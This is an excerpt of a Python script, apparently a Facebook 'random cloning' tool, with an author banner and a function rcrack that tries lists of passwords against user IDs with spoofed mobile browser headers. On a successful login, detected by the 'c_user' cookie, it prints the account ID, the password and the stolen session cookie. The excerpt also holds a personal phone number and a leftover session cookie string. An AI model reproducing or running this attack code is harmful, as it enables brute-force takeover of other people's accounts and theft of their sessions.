...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/shihabrana2023?mibextid=ZbWKwL')
logo =("""  
 ######  ##     ## #### ##     ##    ###    ########  
##    ## ##     ##  ##  ##     ##   ## ##   ##     ## 
##       ##     ##  ##  ##     ##  ##   ##  ##     ## 
...
\033[0;93m╠══[Author:=======================> \33[1;38mMR. Shihab\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> Shihab Rana      ║  \033[1;97m
╠══[Github:=======================> \33[1;38mShihab-King      ║\33[1;34m
╠══[Whatsapp:=====================> 01968965844     ║\33[1;35m
╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
╠══[VERSION:======================> Free Tools       ║\033[1;35m
\033[0;92m╚═══════════════════════════════════════════════════╝\033[1;31m
    """) 
loop = 0
oks = []
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
         ...
         # 'cookie': 'datr=vFweZbyzAlL0lPUSyvx1DYF-; sb=vFweZfcMd01DgTK1O9teZD4M; m_pixel_ratio=2; wd=360x708; fr=0FatXO0JBNuVf4lEX..BlHly8.7Q.AAA.0.0.BlHlzC.AWUFIT0_UQE',
          'dpr': '2',
         ...
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Shihab-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Shihab{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
